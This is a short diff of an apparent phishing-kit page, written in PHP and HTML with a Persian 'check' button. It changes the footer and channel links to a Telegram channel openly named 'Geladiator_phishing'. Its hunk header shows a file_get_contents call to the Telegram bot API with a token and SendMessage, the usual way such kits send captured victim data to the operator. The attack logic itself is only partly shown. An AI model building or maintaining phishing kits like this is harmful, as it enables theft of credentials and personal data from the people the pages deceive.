@@ -124,12 +124,12 @@ file_get_contents("https://api.telegram.org/bot".$TOKEN."/SendMessage?chat_id=".
 
                             <div class="form-button">
                                 <button id="submit" type="submit" class="ibtn">چک</button> 
-                    <a href="../../https://t.me/Dr_wex"><font color="#4B0082">CHANNEL</font></a>
+                    <a href="https://t.me/Geladiator_phishing"><font color="#4B0082">CHANNEL</font></a>
                             </div>
                         </form>
                         <div class="other-links">
 
-                    <a href="../../https://t.me/Dr_Wex"><font color="#00ffff">CODED BY Geladiator_phishing </font></a>
+                    <a href="https://t.me/Geladiator_phishing"><font color="#00ffff">CODED BY Geladiator_phishing </font></a>
 
     </div>
                         </form>
